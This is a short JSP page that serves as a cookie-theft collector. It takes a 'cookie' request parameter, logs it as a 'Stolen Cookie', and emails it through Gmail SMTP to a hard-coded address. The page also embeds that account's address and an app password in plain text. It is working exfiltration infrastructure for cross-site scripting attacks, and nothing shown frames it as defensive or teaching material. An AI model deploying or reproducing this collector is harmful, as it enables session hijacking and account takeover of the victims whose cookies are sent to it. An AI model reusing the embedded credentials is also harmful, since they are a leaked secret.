<%@ page import="java.io.IOException, java.util.Properties, jakarta.servlet.ServletException, jakarta.servlet.http.*, jakarta.mail.*,jakarta.mail.internet.*" %>
<%
	
    String cookie = request.getParameter("cookie");
    System.out.println("Stolen Cookie: " + cookie);
    
    String to = "rushtophilip@gmail.com";
    String subject = "Mail Testing";
    String messageText = cookie;

    final String from = "rushtophilip@gmail.com";
    final String password = "pmig rico oxas fbar"; // NOT normal password

    // SMTP configuration
    Properties props = new Properties();
    props.put("mail.smtp.host", "smtp.gmail.com");
    props.put("mail.smtp.port", "587");
    props.put("mail.smtp.auth", "true");
    props.put("mail.smtp.starttls.enable", "true");

    // Session
    Session session1 = Session.getInstance(props,
        new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(from, password);
            }
        });

    try {
        Message message = new MimeMessage(session1);
        message.setFrom(new InternetAddress(from));
        message.setRecipients(Message.RecipientType.TO,
                InternetAddress.parse(to));
        message.setSubject(subject);
        message.setText(messageText);

        Transport.send(message);

        response.getWriter().println("Email Sent Successfully!");

    } catch (MessagingException e) {
        throw new RuntimeException(e);
    }
%>

